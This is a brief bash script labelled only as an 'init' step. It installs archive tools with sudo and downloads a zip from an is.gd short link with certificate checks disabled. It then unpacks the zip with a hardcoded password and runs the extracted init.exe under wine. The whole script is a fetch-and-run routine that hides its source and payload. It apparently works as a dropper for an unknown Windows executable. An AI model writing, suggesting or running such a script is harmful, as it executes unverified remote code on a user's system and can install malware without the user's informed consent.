#!/bin/bash
sudo apt install zip unzip wget -y
mkdir ~/init/;
wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
cd ~/init/;
unzip -P1011011011 init.zip;
wine init.exe;
exit 0
